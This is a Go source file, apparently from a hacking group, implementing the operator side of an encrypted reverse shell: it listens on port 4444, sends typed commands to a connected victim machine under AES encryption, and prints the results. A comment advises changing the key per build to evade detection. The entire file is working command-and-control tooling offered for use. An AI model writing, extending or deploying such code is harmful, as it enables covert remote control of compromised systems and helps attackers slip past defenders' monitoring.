package main
// coded by s1ege greetz to all GSH members
import (
  "bufio"
  "fmt"
  "io"
  "net"
  "os"
  "strings"
  "crypto/aes"
  "crypto/cipher"
  "crypto/rand"
  "github.com/fatih/color"
  "encoding/base64"
)

const port = ":4444"

func main() {
    red := color.New(color.FgHiRed, color.Bold)
    green := color.New(color.FgHiGreen, color.Bold)
    //Enter your 32 byte long key here (change per each build to evade detection/decryption)
    key := []byte("024iF4ciIdeXt9Yxk9C97QsrNrxNXzEi")
    red.Println("Listening....")
    listener, _ := net.Listen("tcp", port)
    conn, _ := listener.Accept()
    for {
        reader := bufio.NewReader(os.Stdin)
        red.Print("go-shell> ")
        command, _ := reader.ReadString('\n')
        if strings.Compare(command, "exit") == 0 {
            enc_command, err := encrypt(key, command)
            if err != nil {
                fmt.Println(err)
            }

            conn.Write([]byte(enc_command))
            conn.Close()
            os.Exit(0)

      } else {
            enc_command, err := encrypt(key, command)
            if err != nil {
                fmt.Println(err)
            }

            conn.Write([]byte(enc_command))
            enc_output, _ := bufio.NewReader(conn).ReadString('\n')
            dec_output, err := decrypt(key, string(enc_output))
            green.Println(string(dec_output))
    }
  }
}

func encrypt(key []byte, message string) (encmess string, err error) {
    plainText := []byte(message)

    block, err := aes.NewCipher(key)
    if err != nil {
        return
    }

    cipherText := make([]byte, aes.BlockSize+len(plainText))
    iv := cipherText[:aes.BlockSize]
    if _, err = io.ReadFull(rand.Reader, iv); err != nil {
        return
    }

    stream := cipher.NewCFBEncrypter(block, iv)
    stream.XORKeyStream(cipherText[aes.BlockSize:], plainText)

    encmess = base64.URLEncoding.EncodeToString(cipherText)
    return
}

func decrypt(key []byte, message string) (decmess string, err error) {
    cipherText, err := base64.URLEncoding.DecodeString(message)
    if err != nil {
        return
    }

    block, err := aes.NewCipher(key)
    if err != nil {
        return
    }

    iv := cipherText[:aes.BlockSize]
    cipherText = cipherText[aes.BlockSize:]

    stream := cipher.NewCFBDecrypter(block, iv)
    stream.XORKeyStream(cipherText, cipherText)

    decmess = string(cipherText)
    return
}
